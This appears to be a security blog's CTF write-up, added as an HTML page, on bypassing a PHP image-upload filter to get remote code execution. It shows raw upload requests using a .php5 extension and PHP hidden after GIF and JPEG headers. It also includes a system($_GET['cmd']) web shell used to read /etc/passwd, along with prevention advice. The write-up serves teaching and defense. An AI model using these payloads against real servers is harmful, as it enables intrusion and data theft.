@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="This challenge highlight the potential risks of bad upload handling and how it can lead to remote code execution on server. In this writeup will go back to the basics and discuss the most common ways">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Misc CTF - Upload Restrictions Bypass">
+<meta property="og:url" content="https://hg8.sh/posts/misc-ctf/upload-restriction-bypass/index.html">
+<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
+<meta property="og:description" content="This challenge highlight the potential risks of bad upload handling and how it can lead to remote code execution on server. In this writeup will go back to the basics and discuss the most common ways">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/123555482-3afa3e00-d786-11eb-9491-f06f6c82d28f.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/123555521-93c9d680-d786-11eb-8756-fb2923936bca.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/123555728-d04a0200-d787-11eb-8398-f63c4ca46462.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/123555766-169f6100-d788-11eb-8f89-81434c208186.png">
+<meta property="article:published_time" content="2021-04-26T22:00:00.000Z">
+<meta property="article:modified_time" content="2021-06-27T18:44:28.300Z">
+<meta property="article:author" content="hg8">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="upload bypass">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/123555482-3afa3e00-d786-11eb-9491-f06f6c82d28f.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+     
+    <title>Misc CTF - Upload Restrictions Bypass :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+    
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="hg8's Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/posts/misc-ctf/graphql-injection/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/posts/sneakymailer/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+    </span>
+    <br/>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sending-PHP-files"><span class="toc-number">2.</span> <span class="toc-text">Sending PHP files</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypassing-file-extension-restriction"><span class="toc-number">3.</span> <span class="toc-text">Bypassing file extension restriction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypassing-File-Content-Check"><span class="toc-number">4.</span> <span class="toc-text">Bypassing File Content Check</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Using-PHP-for-Remote-Code-Execution"><span class="toc-number">5.</span> <span class="toc-text">Using PHP for Remote Code Execution</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">6.</span> <span class="toc-text">References</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Prevention-Methods"><span class="toc-number">7.</span> <span class="toc-text">Prevention Methods</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Real-Life-Example"><span class="toc-number">8.</span> <span class="toc-text">Real Life Example</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        <header id="header">
+  <a href="/">
+  
+      <div id="logo" style="background-image: url(/images/logo.webp);"></div>
+  
+    <span class="logo__mark"></span>
+    <span class="logo__text">./hg8.sh</span>
+    <span class="logo__cursor"></span>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
+      </li>
+       
+        <li><a href="/">Home</a></li>
+       
+        <li><a href="/about/">About</a></li>
+       
+        <li><a href="/archives/">Posts</a></li>
+       
+        <li><a href="/search/">Search</a></li>
+      
+    </ul>
+  </div>
+</header>
+
+        
+          <br>
+          <br>
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Misc CTF - Upload Restrictions Bypass
+    </h1>
+
+
+
+    <div class="meta"> 
+      
+    <div class="postdate">
+      
+        <time datetime="2021-04-26T22:00:00.000Z" itemprop="datePublished">27-04-2021</time>
+        
+      
+    </div>
+
+
+      — Written by 
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hg8</span>
+      </span>
+      —
+      7 min read
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>This challenge highlight the potential risks of bad upload handling and how it can lead to remote code execution on server. In this writeup will go back to the basics and discuss the most common ways to bypass upload restrictions to achieve RCE.</p>
+<p><strong>Tl;Dr:</strong> The upload server don’t check correctly the file type of uploaded images. It’s possible to bypass the filter by uploading <code>php5</code>, GIF, or JPEG file containing PHP commands that get executed by the server. </p>
+<p>Alright! Let’s get into the details now!</p>
+<hr>
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>Opening the challenge display the following website:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/123555482-3afa3e00-d786-11eb-9491-f06f6c82d28f.png" alt="look at me misc ctf"></p>
+<p>Once we upload an image we can see it being stored on the server:</p>
+<img width="1253" alt="image upload misc ctf" src="https://user-images.githubusercontent.com/9076747/123555521-93c9d680-d786-11eb-8756-fb2923936bca.png">
+
+
+
+<p>While looking at the request information we notice the app is running PHP 5. This might come useful later:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://misc.ctf:33432/ -I</span><br><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.14.2</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Wed, 17 Jun 2020 08:24:44 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.6.40</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Sending-PHP-files"><a href="#Sending-PHP-files" class="headerlink" title="Sending PHP files"></a>Sending PHP files</h2><p>So far we know that the file we send is being stored on the server and the server is running PHP. With those informations we can imagine one way to abuse this upload form: If we could manage to send PHP files we could potentially execute our own PHP script on the server and get full control of it.</p>
+<p>Let’s see how we can do that.</p>
+<p>First to have a file executed as PHP we need this file to have a valid PHP extension to be recognised as such by the server. </p>
+<p>Let’s edit the request made when uploading a file by changing <code>filename</code> parameter to see if we can change our image file to have a <code>.php</code> extension:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>misc.ctf:33432</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=X</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>158</span><br><span class="line">--X</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;image&quot;; filename=&quot;1591801133556.php&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/jpeg</span><br><span class="line">ÿØÿà�JFIF����ÿþ�Compressed by jpeg-recompressÿÛ&quot;&quot;*%%*424DD\&quot;*%%*424DD\ÿÂÿÄ</span><br><span class="line">/Òóêaó|ª3¥&#125;ZóQO 7-ñCÒßUÝÝ&#123;cót;£òÌzRãÿÄÿÚÿÄÿÚÿÄ1&quot;$Qr%023ASTcÿÚý«Ê|~   YßZE6ÙHè²Òà(¤\&quot;r«¬£u°übnG³Ø=&#125;MzMb&#123;³äÐ\rM¤z&#123;h¼EÁd¢øëè~ËªkÊlZPÚE°fãc&quot;#¢óDM&quot;</span><br><span class="line">--X--</span><br></pre></td></tr></table></figure>
+
+
+
+<p>And bummer the server return to us a <code>400 Bad Request</code>.</p>
+<p>After a few different tries it’s easy to notice that the server is using a blacklist and not a whitelist of “valid” file extension since it’s possible to upload <code>.xyz</code>, <code>.phhp</code>, <code>.html</code> and so on.</p>
+<p>So now we know that the server is blacklisting <code>.php</code> extension. And as with every blacklist we know that something will probably be forgotten…</p>
+<h2 id="Bypassing-file-extension-restriction"><a href="#Bypassing-file-extension-restriction" class="headerlink" title="Bypassing file extension restriction"></a>Bypassing file extension restriction</h2><p>Firstly it’s good to know that not only .php file gets interpreted as PHP by servers, there is some other less used extensions that gets interpreted as-well:</p>
+<ul>
+<li>.phtml</li>
+<li>.php3</li>
+<li>.php4</li>
+<li>.php5</li>
+<li>.inc</li>
+</ul>
+<p>Maybe one of those extension is not blacklisted by the server ?</p>
+<p>Since we know the server is running PHP5 let’s give a try to <code>.php5</code> extension:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>misc.ctf:33432</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=X</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>158</span><br><span class="line">--X</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;image&quot;; filename=&quot;1591801133556.php5&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/jpeg</span><br><span class="line">ÿØÿà�JFIF����ÿþ�Compressed by jpeg-recompressÿÛ&quot;&quot;*%%*424DD\&quot;*%%*424DD\ÿÂÿÄ</span><br><span class="line">/Òóêaó|ª3¥&#125;ZóQO 7-ñCÒßUÝÝ&#123;cót;£òÌzRãÿÄÿÚÿÄÿÚÿÄ1&quot;$Qr%023ASTcÿÚý«Ê|~   YßZE6ÙHè²Òà(¤\&quot;r«¬£u°übnG³Ø=&#125;MzMb&#123;³äÐ\rM¤z&#123;h¼EÁd¢øëè~ËªkÊlZPÚE°fãc&quot;#¢óDM&quot;</span><br><span class="line">--X--</span><br></pre></td></tr></table></figure>
+
+<p>Bingo! The file got uploaded and is now accessible on the server:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://misc.ctf:33432/1592382731183.php5 -I</span><br><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.14.2</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Wed, 17 Jun 2020 08:54:55 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.6.40</span><br></pre></td></tr></table></figure>
+
+<p><em>Note: It was also possible to use capital PHP extension to bypass the filter (<code>.PHP</code>, <code>.pHp</code>, etc…)</em></p>
+<p>Alright we have a file that can get executed as PHP, now we need to put actual PHP content in it.</p>
+<p>Let’s give a try like before:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>misc.ctf:33432</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=X</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>158</span><br><span class="line">--X</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;image&quot;; filename=&quot;1591801133556.php5&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/jpeg</span><br><span class="line">&lt;?php phpinfo();</span><br><span class="line">--X--</span><br></pre></td></tr></table></figure>
+
+<p>And again we get hit by a <code>400 Bad Request</code>. Seems like there is another check on the file content itself now…</p>
+<h2 id="Bypassing-File-Content-Check"><a href="#Bypassing-File-Content-Check" class="headerlink" title="Bypassing File Content Check"></a>Bypassing File Content Check</h2><p>If we check the PHP documentation on how to check a file for its type we stumble upon <code>mime_content_type()</code>:</p>
+<blockquote>
+<p>mime_content_type<br>Detect MIME Content-type for a file<br><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.mime-content-type.php">https://www.php.net/manual/en/function.mime-content-type.php</a></p>
+</blockquote>
+<p>Well so far we know for sure that GIF and JPEG files are allowed. Can we possibly snuggle PHP into one of those two files?</p>
+<p><strong>Including PHP in a GIF file</strong></p>
+<p>Reading through the <a target="_blank" rel="noopener" href="https://www.w3.org/Graphics/GIF/spec-gif89a.txt">GIF Specification</a> we found that the Comment Extension allows to put a comment in the GIF at the end of the file. We should probably be able to put PHP code there:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    7 6 5 4 3 2 1 0        Field Name                    Type</span><br><span class="line">   +---------------+</span><br><span class="line">0  |      0x21     |       Extension Introducer          Byte</span><br><span class="line">   +---------------+</span><br><span class="line">1  |      0xFE     |       Comment Label                 Byte</span><br><span class="line">   +---------------+</span><br><span class="line"></span><br><span class="line">   +===============+</span><br><span class="line">   |    &lt;?         |</span><br><span class="line">N  |    phpinfo(); |       Comment Data            Data Sub-blocks</span><br><span class="line">   |               |</span><br><span class="line">   +===============+</span><br><span class="line"></span><br><span class="line">   +---------------+</span><br><span class="line">0  |       ;       |       Block Terminator              Byte</span><br><span class="line">   +---------------+</span><br></pre></td></tr></table></figure>
+
+<p>Since PHP <code>mime_content_type()</code> function validate a file as being a “GIF” simply if the GIF header is present, we should be able to append PHP code to the GIF Header and bypass the upload restriction. Let’s give it a try.</p>
+<p>The simplest way is to append our PHP code to the <code>GIF89a</code> header: <code>GIF89a;&lt;?=phpinfo();</code>.</p>
+<p>Let’s send that:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>misc.ctf:33432</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=X</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>158</span><br><span class="line">--X</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;image&quot;; filename=&quot;1592382731186.php5&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/gif</span><br><span class="line">GIF89a;&lt;?=phpinfo();</span><br><span class="line">--X--</span><br></pre></td></tr></table></figure>
+
+<p>This time the file gets uploaded successfully. We can find our phpinfo being executed when opening the file:</p>
+<img width="1347" alt="phpinfo gif misc ctf" src="https://user-images.githubusercontent.com/9076747/123555728-d04a0200-d787-11eb-8398-f63c4ca46462.png">
+
+
+
+<p><strong>Including PHP in a JPEG file</strong></p>
+<p>Following the same idea it’s also possible to append PHP into a JPEG image.</p>
+<p>The JPEG header being slightly less complicated than the <code>GIF89a</code> of GIF we can append our PHP code to an existing JPEG image to keep it simple:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;&lt;?=phpinfo();&quot;</span> &gt;&gt; myimage.jpg</span><br></pre></td></tr></table></figure>
+
+<p>And upload it as before:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>misc.ctf:33432</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=X</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>158</span><br><span class="line">--X</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;image&quot;; filename=&quot;1592382731190.php5&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/jpeg</span><br><span class="line">ÿØÿà�JFIF����ÿþ�Compressed by jpeg-recompressÿÛ&quot;&quot;*%%*424DD\&quot;*%%*424DD\ÿÂÿÄ</span><br><span class="line">/Òóêaó|ª3¥&#125;ZóQO 7-ñCÒßUÝÝ&#123;cót;£òÌzRãÿÄÿÚÿÄÿÚÿÄ1&quot;$Qr%023ASTcÿÚý«Ê|~   YßZE6ÙHè²Òà(¤\&quot;r«¬£u°übnG³Ø=&#125;MzMb&#123;³äÐ\rM¤z&#123;h¼EÁd¢øëè~ËªkÊlZPÚE°fãc&quot;#¢óDM&quot;&lt;?=phpinfo();</span><br><span class="line">--X--</span><br></pre></td></tr></table></figure>
+
+<p>The file gets uploaded successfully. And even though the output contains a bit more rubbish (the actual JPEG bytes), our PHP code get successfully executed:</p>
+<img width="1346" alt="phpinfo jpeg misc ctf" src="https://user-images.githubusercontent.com/9076747/123555766-169f6100-d788-11eb-8f89-81434c208186.png">
+
+
+
+<h2 id="Using-PHP-for-Remote-Code-Execution"><a href="#Using-PHP-for-Remote-Code-Execution" class="headerlink" title="Using PHP for Remote Code Execution"></a>Using PHP for Remote Code Execution</h2><p>Having a way to execute PHP on the serveur make it easy to escalate to Remote Code Execution on the server. </p>
+<p>We can use for example the <code>system()</code> function of PHP:</p>
+<blockquote>
+<p><strong>system</strong><br>system — Execute an external program and display the output<br><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.system.php">https://www.php.net/manual/en/function.system.php</a></p>
+</blockquote>
+<p>Let’s create a new malicious file and upload it:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>misc.ctf:33432</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=X</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>158</span><br><span class="line">--X</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;image&quot;; filename=&quot;1592382731199.php5&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/gif</span><br><span class="line">GIF89a;&lt;?=echo(system($_GET[&#x27;cmd&#x27;]));</span><br><span class="line">--X--</span><br></pre></td></tr></table></figure>
+
+<p>And now we should be able to pass our command as <code>cmd</code> parameters to get executed on server side:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">&quot;http://misc.ctf:33433/1592382731199.php5?cmd=cat/etc/passwd&quot;</span></span><br><span class="line">GIF89a;root:x:0:0:root:/root:/bin/ash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+<p>And finally while looking for the <em>Look at Me</em> app source code we find the flag:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">&quot;http://misc.ctf:33433/1592382731199.php5?cmd=cat%20index.php&quot;</span></span><br><span class="line">GIF89a;<span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// flag&#123;4 IM493 k4N Hid3 PHp!&#125;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>])) &#123;</span><br><span class="line"> <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload">Weak Protections on File Upload | OWASP</a></li>
+<li><a target="_blank" rel="noopener" href="https://sushant747.gitbooks.io/total-oscp-guide/bypass_image_upload.html">Bypass File Upload Filtering | OSCP Guide</a></li>
+<li><a target="_blank" rel="noopener" href="https://medium.com/caio-noobs-around/six-files-that-are-also-a-valid-php-540343ad35c8">Six files that are also a valid PHP</a></li>
+</ul>
+<h2 id="Prevention-Methods"><a href="#Prevention-Methods" class="headerlink" title="Prevention Methods"></a>Prevention Methods</h2><ul>
+<li>Use a server-generated filename if storing uploaded files on disk.</li>
+<li>Inspect the content of uploaded files, and enforce a whitelist of accepted, non-executable content types. Additionally, enforce a blacklist of common executable formats, to hinder hybrid file attacks.</li>
+<li>Enforce a whitelist of accepted, non-executable file extensions.</li>
+<li>If uploaded files are downloaded by users, supply an accurate non-generic Content-Type header, the X-Content-Type-Options: nosniff header, and also a Content-Disposition header that specifies that browsers should handle the file as an attachment.</li>
+<li>Enforce a size limit on uploaded files (for defense-in-depth, this can be implemented both within application code and in the web server’s configuration).</li>
+<li>Reject attempts to upload archive formats such as ZIP.</li>
+<li>Uploaded directory should not have any “execute” permission and all the script handlers should be removed from these directories.</li>
+<li>All the control characters and Unicode ones should be removed from the filenames and their extensions without any exception.</li>
+</ul>
+<h2 id="Real-Life-Example"><a href="#Real-Life-Example" class="headerlink" title="Real Life Example"></a>Real Life Example</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://hackerone.com/reports/506646">Webshell via File Upload on ecjobs.starbucks.com.cn</a><a target="_blank" rel="noopener" href="https://hackerone.com/reports/506646"> </a><a target="_blank" rel="noopener" href="https://hackerone.com/reports/506646">($4,000)</a><a target="_blank" rel="noopener" href="https://hackerone.com/reports/506646"> | HackerOne</a></li>
+</ul>
+<hr>
+<p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p>
+<p>See you next time ;)</p>
+<p>-hg8</p>
+
+  </div>
+</article>
+<br>
+<br>
+
+
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/Misc/">Misc</a>
+    </div>
+
+
+
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/linux/" rel="tag">linux</a>, <a class="tag-link-link" href="/tags/upload-bypass/" rel="tag">upload bypass</a>
+    </div>
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sending-PHP-files"><span class="toc-number">2.</span> <span class="toc-text">Sending PHP files</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypassing-file-extension-restriction"><span class="toc-number">3.</span> <span class="toc-text">Bypassing file extension restriction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypassing-File-Content-Check"><span class="toc-number">4.</span> <span class="toc-text">Bypassing File Content Check</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Using-PHP-for-Remote-Code-Execution"><span class="toc-number">5.</span> <span class="toc-text">Using PHP for Remote Code Execution</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">6.</span> <span class="toc-text">References</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Prevention-Methods"><span class="toc-number">7.</span> <span class="toc-text">Prevention Methods</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Real-Life-Example"><span class="toc-number">8.</span> <span class="toc-text">Real Life Example</span></a></li></ol>
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021
+    <a href="https://hg8.sh">hg8.sh</a>
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    
